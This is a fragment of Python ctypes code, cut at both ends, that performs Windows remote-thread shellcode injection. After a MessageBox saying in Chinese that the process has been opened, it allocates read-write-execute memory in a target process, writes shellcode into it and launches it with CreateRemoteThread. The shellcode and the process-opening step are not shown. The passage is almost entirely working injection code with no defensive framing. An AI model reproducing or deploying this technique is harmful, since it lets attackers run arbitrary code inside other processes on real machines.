...
user32.MessageBoxA(0,"已打开进程","提示",0)
addr=kernel32.VirtualAllocEx(hProcess,0,shellcode_size,VIRTUAL_MEM,PAGE_EXECUTE_READWRITE)
written = c_int(0)
kernel32.WriteProcessMemory(hProcess,addr,shellcode,shellcode_size,byref(written))
thread_id=c_ulong(0)
if not kernel32.CreateRemoteThread(hProcess,None,0,addr,None,0,byref(thread_id)):
